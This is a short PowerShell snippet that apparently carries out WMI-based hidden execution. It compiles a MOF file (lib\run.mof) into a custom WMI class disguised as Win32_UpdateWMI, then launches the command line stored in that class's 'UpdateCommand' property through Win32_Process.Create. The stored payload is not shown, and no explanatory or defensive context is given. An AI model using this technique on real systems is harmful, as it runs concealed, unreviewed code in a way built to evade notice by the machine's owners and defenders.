mofcomp.exe $PWD\lib\run.mof
Invoke-CimMethod -ClassName Win32_Process -Method Create -Arguments @{ CommandLine = (Get-CimInstance -ClassName Win32_UpdateWMI).UpdateCommand}